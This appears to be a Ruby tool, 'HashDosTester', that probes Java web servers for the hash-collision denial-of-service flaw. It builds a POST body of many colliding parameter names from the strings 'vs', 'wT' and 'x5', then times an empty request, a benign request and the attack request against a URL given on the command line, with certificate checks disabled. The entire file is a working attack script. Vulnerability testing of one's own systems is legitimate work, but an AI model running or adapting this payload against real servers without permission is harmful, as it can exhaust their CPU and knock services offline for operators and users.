#!/usr/bin/env ruby
require 'uri'
require 'net/http'
require 'net/https'

if ARGV.count != 2
  	puts "Usage: HashDosTester <url> <parameters>\n"
	puts "  url        - url to test\n"
	puts "  parameters - number of parameters to send (max 13817466)\n"
	exit(0)
end

def perm(a, b)
	a.map{ |x| b.map{ |y| x + y }}.flatten
end

def run_request(http, uri, data)
	begin
		start = Time.now
		headers = {
			'Content-Type' => 'application/x-www-form-urlencoded'
		}
		resp = http.post(uri.path, data, headers)
		puts " - Result: " + resp.code.to_s + " - " + resp.message + "\n" 
		t = Time.now - start
		resp.each {|key, val| printf "\t   %-14s: %-40.40s\n", key, val }
		puts " - Time  : " + t.to_s + "\n"
		puts "\n"
		t
	rescue StandardError => bang
		puts "ERROR: " + bang.to_s + "\n"
		exit(1)
	end
end

def build_java_payload(size)
	s = ["vs", "wT", "x5"]
	l = perm(s, s)
	m = perm(l, l)
	n = perm(m, m)
	o = perm(n, m)
	o.first(size).map {|p| p + "=" }.join "&"
end

def run_payload(uri, payload)
	benign = payload.gsub(/(=|&)/, "x")
	http = Net::HTTP.new(uri.host, uri.port)
	if (uri.scheme == 'https')
		http.use_ssl = true
		http.ssl_timeout = 1
		http.verify_mode = OpenSSL::SSL::VERIFY_NONE
	end
	
	puts "Request size: " + payload.length.to_s + " bytes\n\n"

	puts "Sending empty request\n"
	run_request http, uri, ""

	puts "Sending benign request\n"
	t1 = run_request http, uri, benign

	puts "Sending attack request\n"
	t2 = run_request http, uri, payload 
	puts "\n"
	puts "Difference between benign and attack: " + (t2-t1).round(4).to_s + " (" + (t2/t1*100).round(1).to_s + "%)\n\n"
end
def preflight(uri) 
	#For some reason this speeds up connect on windows
	require 'socket'

	context = OpenSSL::SSL::SSLContext.new
	tcp_client = TCPSocket.new uri.host, uri.port
	ssl_client = OpenSSL::SSL::SSLSocket.new tcp_client, context
	ssl_client.connect
end

parameters = ARGV[1].to_i
uri = URI(ARGV[0])

puts "Uri         : " + uri.to_s + "\n"
puts "Parameters  : " + parameters.to_s + "\n"

puts "\n"

if (uri.scheme == 'https')
	preflight(uri)
end

puts "Running java payload\n"
payload = build_java_payload(parameters)
run_payload(uri, payload)
